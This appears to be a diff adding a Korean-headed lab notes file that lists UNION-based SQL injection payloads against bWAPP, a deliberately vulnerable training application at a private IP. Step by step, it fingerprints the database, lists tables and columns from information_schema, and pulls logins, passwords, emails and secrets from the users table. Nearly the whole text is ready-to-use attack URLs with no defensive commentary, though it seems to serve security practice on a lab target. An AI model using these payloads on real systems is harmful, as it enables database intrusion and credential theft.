@@ -1,0 +1,56 @@
+ 4) SQL 인젝션
+
+ ① 
+
+0 union select all 1,2,3,4,5,6,7 #
+
+
+ ② 
+
+0 union select all 1,database(),user(),system_user(),version(),6,7 #
+
+
+ ③ 
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,table_schema,table_name,4,5,6,7 from information_schema.tables #&action=go
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,table_schema,table_name,4,5,6,7 from information_schema.tables limit 17,1 #&action=go
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,table_schema,table_name,4,5,6,7 from information_schema.tables limit 18,1 #&action=go
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,table_schema,table_name,4,5,6,7 from information_schema.tables limit 19,1 #&action=go
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,table_schema,table_name,4,5,6,7 from information_schema.tables limit 20,1 #&action=go
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,table_schema,table_name,4,5,6,7 from information_schema.tables limit 21,1 #&action=go
+
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,table_schema,table_name,4,5,6,7 from information_schema.tables where table_schema='bWAPP' limit 0,1#&action=go
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,table_schema,table_name,4,5,6,7 from information_schema.tables where table_schema='bWAPP' limit 1,1#&action=go
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,table_schema,table_name,4,5,6,7 from information_schema.tables where table_schema='bWAPP' limit 2,1#&action=go
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,table_schema,table_name,4,5,6,7 from information_schema.tables where table_schema='bWAPP' limit 3,1#&action=go
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,table_schema,table_name,4,5,6,7 from information_schema.tables where table_schema='bWAPP' limit 4,1#&action=go
+
+
+ ④ 
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,table_schema,table_name,4,column_name,6,7 from information_schema.columns where table_name='users' and table_schema='bWAPP' limit 0,1 #&action=go
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,table_schema,table_name,4,column_name,6,7 from information_schema.columns where table_name='users' and table_schema='bWAPP' limit 1,1 #&action=go
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,table_schema,table_name,4,column_name,6,7 from information_schema.columns where table_name='users' and table_schema='bWAPP' limit 2,1 #&action=go
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,table_schema,table_name,4,column_name,6,7 from information_schema.columns where table_name='users' and table_schema='bWAPP' limit 3,1 #&action=go
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,table_schema,table_name,4,column_name,6,7 from information_schema.columns where table_name='users' and table_schema='bWAPP' limit 4,1 #&action=go
+
+
+ ⑤ 
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,login,password,email,secret,6,7 from users limit 0,1 #&action=go
+
+http://192.168.20.205/bWAPP/sqli_2.php?movie=0 union select all 1,login,password,email,secret,6,7 from users limit 1,1 #&action=go
+
